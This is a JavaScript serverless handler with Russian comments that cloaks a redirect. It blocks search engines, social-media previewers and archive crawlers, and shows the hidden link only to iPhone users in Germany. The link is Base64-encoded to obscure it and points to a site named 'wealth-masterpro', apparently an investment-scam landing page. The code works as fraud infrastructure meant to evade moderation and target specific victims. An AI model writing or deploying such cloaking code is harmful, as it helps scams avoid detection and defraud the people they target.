export default async function handler(req, res) {
  const userAgent = req.headers['user-agent'] || '';
  const acceptLang = req.headers['accept-language'] || '';
  const country = req.headers['cf-ipcountry'] || '';

  const isBot = /(google|bot|crawler|spider|facebook|preview|archive|bing)/i.test(userAgent);
  const isIphone = /iPhone/i.test(userAgent);
  const isGermany = country.toUpperCase() === 'DE';

  if (isBot) {
    return res.status(403).json({ status: 'bot' });
  }

  // Здесь: если НЕ айфон или НЕ Германия — возвращаем status ok, но без ссылки
  if (!isIphone || !isGermany) {
    return res.status(200).json({ status: 'ok' }); // НЕТ поля url
  }

  // Зашифрованная ссылка (Base64)
  const encodedUrl = 'aHR0cHM6Ly93ZWFsdGgtbWFzdGVycHJvLmNvbS9kZS8='; // https://wealth-masterpro.com/de/
  const decodedUrl = Buffer.from(encodedUrl, 'base64').toString('utf-8');

  return res.status(200).json({
    status: 'ok',
    url: decodedUrl
  });
}
